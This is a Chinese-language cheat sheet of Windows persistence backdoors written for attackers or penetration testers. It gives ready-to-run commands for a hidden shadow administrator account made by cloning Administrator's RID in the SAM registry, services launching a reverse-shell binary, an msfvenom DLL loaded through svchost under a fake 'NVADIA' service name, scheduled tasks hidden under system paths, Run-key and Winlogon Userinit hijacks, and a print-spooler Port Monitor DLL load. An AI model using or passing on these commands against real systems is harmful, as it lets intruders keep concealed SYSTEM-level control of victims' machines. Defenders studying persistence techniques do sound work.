# 常见系统后门

#### 影子账户

创建影子账户

```
net user Adminstrator$ P@ssW0rd! /add
```

定位到`计算机\HKEY_LOCAL_MACHINE\SAM\SAM`右键权限将Administrator用户设置为完全控制, 展开Domains，复制`HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names`中administrator用户建制类型"0x1f4"相同的目录名"0000001F4"表项F的二进制值

```
02 00 01 ...........
```

相同的方法找到影子账户Adminstrator$对应的目录"0000003EA"，将Administrator的F键值替换到影子账户的F键值，实现劫持Administrator用户的RID效果，并选中"Adminstrator$"表项与"0000003EA"一并导出后，删除影子账户

```
net user Adminstrator$ /del
```

将删除掉影子账户注册表重新导入回注册表，完成影子账户创建，实现效果只能从注册表中查看，隐藏了本地用户和组

#### 系统服务后门

* 对于自启动后门，攻击人员可以将服务运行的二进制文件路径设置后后门程序

**创建系统服务**

sc创建服务(修改服务为sc config)：binpath指定二进制文件路径，注意=号后有空格，start指定启动类型，obj指定服务启动权限

```
sc create Backdoor binpath= "cmd.exe /k C:\Windows\System32\reverse_tcp.exe" start= "auto" obj= "localsystem" 
```

**svchost.exe启动服务利用**

* svchost.exe为许多服务的宿主，是DLL中运行服务的通用主机进程名称
* 需要由svchost.exe进程启动的服务都以DLL形式实现
* svchost.exe的所有服务分组位于计算机\HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost中

生成DLL文件马

```
msfvenom -p .... -f dll -o xxx.dll
```

上传DLL到目标主机System32目录

```
copy .\xxx.dll \\10.10.10.10\C$\Windows\System32
```

创建后门服务并以svchost加载的方式启动。服务分组为netsvc

```
sc create Backdoor binPath= "C:\Windows\S
ystem32\svchost.exe -k netsvc" start= auto obj= LocalSystem
```

将Backdoor服务启动时加载的DLL为xxx.dll

```
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Backdoor\Parameters /v ServiceDll /t REG_EXPAND_SZ /d "C:\Windows\System32\0.108.9876.dll"
```

配置服务详细

```
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Backdoor /v Description /t REG_SZ /d "Windows NVADIA Service"
```

配置服务显示名称

```
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Backdoor /v DisplayName /t REG_SZ /d "Backdoor"
```

创建服务新分组，将Backdoor服务添加进去，重启上线

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v netsvc /t REG_MULTI_SZ /d Backdoor
```

#### 计划任务后门

* 通过创建计划任务让目标主机在特定的时间点或规定的周期内重复运行测试人员预先准备的后门程序，从而实现权限持久化

在目标主机创建一个名为Backdoor的计划任务，每天8:00以System权限运行一次后门程序

```
schtasks /Create /TN Backdoor /SC daily /ST 08:00 /MO 1 /TR C:\108.exe /RU System /F
```

隐藏式计算任务在`\Microsoft\Windows\AppTask`路径下创建`AppRun`计划任务后门

```
schtasks /Create /TN \Microsoft\Windows\AppTask\AppRun /sc daily /ST 08:00 /MO 1 /TR C:\108.exe /RU System /F
```

#### 启动项&注册表后门

* 将程序放置在启动文件夹中会导致该程序在用户登录时执行

位于以下目录中的程序将在指定用户登录时启动

```
C:\Users\[用户名]\AppData\Roaming\Microsoft\Windows\Start
C:\Users\[用户名]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

位于以下目录中的程序将在所有用户登录时启动

```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StarUp
```

**运行键**

* 当用户登录时，系统会依次检查位于注册表运行键(Run keys)中的程序，并在用户登录上下文中启动

以下注册表项中的程序将在当前用户登录时启动

```
计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

以下注册表项中的程序将在所有用户登录时启动

```
计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

在注册表运行键添加名为BackDoor的后门键

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\System32\0.108.exe"
```

**Winlogon Helper**

* Winlogon为系统组件，用于处理用户有关的各种行为，如登录、注销、锁定屏幕等，这些行为由系统注册表管理

常见的滥用注册表键值，一个为指定用户登录时执行的用户初始化程序，默认为userinit.exe，一个为指定Windows身份验证期间执行的程序，默认为explorer.exe

```
计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
```

在Userinit键上添加108.exe后门程序(后门程序需要被上传到C:\Windows\System32\当中)

```
reg add "\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "C:\Windows\System32\userinit.exe,108.exe" /f
```

**Port Monitors(本地端口监视器)**

* 在print spooler(打印后台处理服务)中，Print Spooler APi存在AddMonitors函数，用于安装Port Monitors(本地端口监视器，并连接配置、数据和监视器文件)
* AddMonitor函数能将DLL注入spoolsv.exe进程

将生成的DLL上传到目标主机的C:\Windows\System32目录，通过编辑注册表安装一个端口监视器,print spooler服务启动过程中会读取Monitors注册表项的所有子键，并以SYSTEM权限加载Driver的键值所指定的DLL文件

```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\TestMonitor" /v "Driver" /t REG_SZ /d "0.108.9876.dll"
```
